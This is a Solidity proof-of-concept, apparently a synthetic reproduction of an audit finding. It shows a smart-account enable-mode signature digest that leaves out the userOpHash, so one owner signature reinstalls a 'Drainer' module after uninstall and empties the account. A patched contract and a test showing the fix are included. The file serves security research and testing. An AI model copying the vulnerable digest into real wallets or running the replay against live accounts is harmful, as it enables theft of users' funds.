// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Biconomy Nexus — enable-mode signature replay
    (Spearbit, October 2024, finding 43810).
    SYNTHETIC, cheatcode-free.
    _getEnableModeDataHash is the audited digest: module + initData only.
    userOpHash is not in the struct, so the same signature reinstalls the
    module after the owner uninstalls it and the module drains the account. */

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract MiniToken is IERC20 {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IAccountExec {
    function execute(address to, uint256 amount) external;
}

contract OwnerValidator {
    address public owner;
    mapping(bytes32 => bool) public signed;

    constructor(address _owner) {
        owner = _owner;
    }

    function sign(bytes32 digest) external {
        require(msg.sender == owner, "owner");
        signed[digest] = true;
    }

    function isValidSignatureWithSender(address, bytes32 digest, bytes calldata sig) external view returns (bytes4) {
        if (sig.length > 0 && signed[digest]) return 0x1626ba7e;
        return 0xffffffff;
    }
}

contract Drainer {
    MiniToken public token;

    constructor(MiniToken _token) {
        token = _token;
    }

    function onInstall(bytes calldata initData) external {
        address recipient = abi.decode(initData, (address));
        uint256 bal = token.balanceOf(msg.sender);
        if (bal > 0) IAccountExec(msg.sender).execute(recipient, bal);
    }
}

interface IUninstall {
    function uninstall(address module) external;
}

contract User {
    bool public used;

    function signOnce(OwnerValidator v, bytes32 digest) external {
        require(!used, "once");
        used = true;
        v.sign(digest);
    }

    function uninstall(address account, address module) external {
        IUninstall(account).uninstall(module);
    }
}

contract Account {
    bytes32 public constant MODULE_ENABLE_MODE_TYPE_HASH =
        keccak256("ModuleEnableMode(address module,bytes32 initDataHash)");

    OwnerValidator public validator;
    MiniToken public token;
    address public owner;
    mapping(address => bool) public installed;

    constructor(OwnerValidator _validator, MiniToken _token, address _owner) {
        validator = _validator;
        token = _token;
        owner = _owner;
    }

    function _domainSeparator() internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("Nexus"),
                keccak256("1"),
                block.chainid,
                address(this)
            )
        );
    }

    function _hashTypedData(bytes32 structHash) internal view returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", _domainSeparator(), structHash));
    }

    function _getEnableModeDataHash(address module, bytes calldata initData) internal view returns (bytes32 digest) {
        digest = _hashTypedData(
            keccak256(abi.encode(MODULE_ENABLE_MODE_TYPE_HASH, module, keccak256(initData))) // @> VULN: userOpHash is not in the enable-mode digest, so one signature installs the module again
        );
    }

    function preview(address module, bytes calldata initData) external view returns (bytes32) {
        return _getEnableModeDataHash(module, initData);
    }

    function execute(address to, uint256 amount) external {
        require(installed[msg.sender], "module");
        token.transfer(to, amount);
    }

    function uninstall(address module) external {
        require(msg.sender == owner, "owner");
        installed[module] = false;
    }

    function enableMode(address module, bytes calldata initData, bytes calldata sig, bytes32 userOpHash) external {
        userOpHash;
        bytes32 digest = _getEnableModeDataHash(module, initData);
        require(
            validator.isValidSignatureWithSender(address(this), digest, sig) == 0x1626ba7e, "EnableModeSigError"
        );
        require(!installed[module], "installed");
        installed[module] = true;
        Drainer(module).onInstall(initData);
    }
}

contract AccountFixed {
    bytes32 public constant MODULE_ENABLE_MODE_TYPE_HASH = keccak256(
        "ModuleEnableMode(address module,uint256 moduleType,bytes32 userOpHash,bytes32 initDataHash)"
    );

    OwnerValidator public validator;
    MiniToken public token;
    address public owner;
    mapping(address => bool) public installed;

    constructor(OwnerValidator _validator, MiniToken _token, address _owner) {
        validator = _validator;
        token = _token;
        owner = _owner;
    }

    function _hash(address module, bytes calldata initData, bytes32 userOpHash) internal view returns (bytes32) {
        bytes32 structHash = keccak256(
            abi.encode(MODULE_ENABLE_MODE_TYPE_HASH, module, uint256(2), userOpHash, keccak256(initData))
        );
        bytes32 domain = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("Nexus"),
                keccak256("1"),
                block.chainid,
                address(this)
            )
        );
        return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
    }

    function preview(address module, bytes calldata initData, bytes32 userOpHash) external view returns (bytes32) {
        return _hash(module, initData, userOpHash);
    }

    function execute(address to, uint256 amount) external {
        require(installed[msg.sender], "module");
        token.transfer(to, amount);
    }

    function uninstall(address module) external {
        require(msg.sender == owner, "owner");
        installed[module] = false;
    }

    function enableMode(address module, bytes calldata initData, bytes calldata sig, bytes32 userOpHash) external {
        bytes32 digest = _hash(module, initData, userOpHash);
        require(
            validator.isValidSignatureWithSender(address(this), digest, sig) == 0x1626ba7e, "EnableModeSigError"
        );
        require(!installed[module], "installed");
        installed[module] = true;
        Drainer(module).onInstall(initData);
    }
}

contract Exploit {
    MiniToken public token;
    User public user;
    OwnerValidator public validator;
    Drainer public module;
    Account public account;

    uint256 public stolen;
    bool public reinstalled;

    bytes internal constant SIG = hex"deadbeef";
    bytes32 internal constant HASH_A = bytes32(uint256(1));
    bytes32 internal constant HASH_B = bytes32(uint256(2));

    constructor() {
        token = new MiniToken();
        user = new User();
        validator = new OwnerValidator(address(user));
        module = new Drainer(token);
        account = new Account(validator, token, address(user));
    }

    function run() external {
        bytes memory initData = abi.encode(address(this));
        bytes32 digest = account.preview(address(module), initData);
        user.signOnce(validator, digest);

        account.enableMode(address(module), initData, SIG, HASH_A);
        require(account.installed(address(module)), "first install");
        require(token.balanceOf(address(this)) == 0, "drained too early");

        user.uninstall(address(account), address(module));
        require(!account.installed(address(module)), "still installed");

        token.mint(address(account), 1000e18);
        account.enableMode(address(module), initData, SIG, HASH_B);

        stolen = token.balanceOf(address(this));
        reinstalled = account.installed(address(module));
        require(user.used(), "owner signed more than once");
        require(reinstalled, "replay did not reinstall");
        require(stolen == 1000e18, "account not drained");
        require(token.balanceOf(address(account)) == 0, "funds left on account");
    }

    function runFixed() external {
        AccountFixed fixedAcc = new AccountFixed(validator, token, address(user));
        bytes memory initData = abi.encode(address(this));
        bytes32 digest = fixedAcc.preview(address(module), initData, HASH_A);
        user.signOnce(validator, digest);
        fixedAcc.enableMode(address(module), initData, SIG, HASH_A);
        user.uninstall(address(fixedAcc), address(module));
        token.mint(address(fixedAcc), 1000e18);
        (bool ok,) = address(fixedAcc).call(
            abi.encodeWithSelector(fixedAcc.enableMode.selector, address(module), initData, SIG, HASH_B)
        );
        require(!ok, "bound signature was replayed");
        require(token.balanceOf(address(fixedAcc)) == 1000e18, "fixed account drained");
        require(token.balanceOf(address(this)) == 0, "attacker was paid");
    }
}
